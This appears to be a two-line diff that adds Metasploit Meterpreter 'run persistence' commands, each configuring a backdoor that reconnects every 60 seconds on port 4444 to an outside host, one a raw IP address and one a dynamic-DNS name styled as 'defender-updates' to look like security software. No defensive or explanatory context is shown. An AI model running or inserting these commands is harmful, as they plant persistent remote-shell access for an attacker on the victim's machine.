@@ -1,0 +1,2 @@
+run persistence -U -i 60 -p 4444 -r 103.227.96.78
+run persistence -U -i 60 -p 4444 -r defender-updates.serveftp.com
